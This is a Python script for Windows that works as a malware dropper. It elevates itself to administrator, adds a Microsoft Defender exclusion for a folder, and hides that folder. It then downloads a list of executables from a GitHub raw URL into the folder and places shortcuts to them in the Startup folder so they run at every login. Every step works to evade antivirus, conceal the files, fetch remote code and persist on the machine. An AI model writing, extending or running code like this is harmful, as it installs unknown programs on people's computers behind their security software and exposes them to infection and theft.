# -*- coding: utf-8 -*-
import os
import sys
import ctypes
import requests
import winshell
from win32com.client import Dispatch
from pathlib import Path

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

if not is_admin():
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
    sys.exit()

def add_defender_exclusion(folder_path):
    try:
        powershell_command = f'Add-MpPreference -ExclusionPath "{folder_path}"'
        subprocess.run(["powershell", "-Command", powershell_command], check=True)
    except Exception as e:
        pass 

def download_programs(url, save_path):
    try:
        response = requests.get(url)
        if response.status_code == 200:
            programs = response.text.splitlines()
            for program_url in programs:
                if program_url.strip(): 
                    program_name = program_url.split('/')[-1]
                    program_path = os.path.join(save_path, program_name)
                    with open(program_path, 'wb') as f:
                        f.write(requests.get(program_url).content)
    except Exception as e:
        pass  

def create_hidden_folder(folder_path):
    if not os.path.exists(folder_path):
        os.makedirs(folder_path)
        os.system(f'attrib +h "{folder_path}"')

def create_shortcuts(programs_folder, startup_folder):
    shell = Dispatch('WScript.Shell')
    for program in os.listdir(programs_folder):
        program_path = os.path.join(programs_folder, program)
        shortcut_path = os.path.join(startup_folder, f"{Path(program).stem}.lnk")
        shortcut = shell.CreateShortCut(shortcut_path)
        shortcut.TargetPath = program_path
        shortcut.WorkingDirectory = programs_folder
        shortcut.save()

programs_folder = r"C:\userss"
startup_folder = os.path.join(os.getenv('APPDATA'), r"Microsoft\Windows\Start Menu\Programs\Startup")

if __name__ == "__main__":
    os.system('cls')

    add_defender_exclusion(programs_folder)

    os.system('cls')

    create_hidden_folder(programs_folder)

    os.system('cls')

    programs_url = "https://raw.githubusercontent.com/uj9e/zzz/refs/heads/main/Redeagle/zzz.txt"
    download_programs(programs_url, programs_folder)

    os.system('cls')

    create_shortcuts(programs_folder, startup_folder)

    os.system('cls')
